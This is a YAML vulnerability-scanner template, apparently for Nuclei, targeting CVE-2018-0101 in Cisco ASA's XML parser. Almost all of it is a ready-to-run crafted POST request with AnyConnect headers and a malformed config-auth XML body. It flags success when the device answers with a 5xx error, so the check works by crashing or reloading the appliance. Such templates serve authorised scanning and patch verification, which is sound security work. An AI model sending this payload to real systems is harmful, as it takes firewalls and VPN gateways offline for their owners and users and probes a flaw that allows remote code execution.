id: cve-2018-0101
info:
  author: dwisiswant0
  description: 'A vulnerability in the XML parser of Cisco Adaptive Security Appliance
    (ASA) Software could allow an unauthenticated,

    remote attacker to cause a reload of the affected system or to remotely execute
    code. It was also possible that

    the ASA could stop processing incoming Virtual Private Network (VPN) authentication
    requests due to a low memory condition.

    '
  name: Cisco ASA Denial-of-Service
  reference: https://www.exploit-db.com/exploits/43986
  severity: critical
  tags: cve,cve2018,cisco,dos,rce
requests:
- matchers:
  - dsl:
    - status_code_1 == 200
    type: dsl
  - condition: or
    dsl:
    - status_code_2 == 500
    - status_code_2 == 501
    - status_code_2 == 502
    - status_code_2 == 503
    - status_code_2 == 504
    type: dsl
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\
    X-Aggregate-Auth: 1\nX-Transcend-Version: 1\nAccept-Encoding: identity\nX-AnyConnect-Platform:\
    \ linux-64\nX-Support-HTTP-Auth: false\nX-Pad: 0000000000000000000000000000000000000000\n\
    \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"a\" type=\"\
    a\" aggregate-auth-version=\"a\">\n    <host-scan-reply>A</host-scan-reply>\n\
    </config-auth>\n"
  req-condition: true
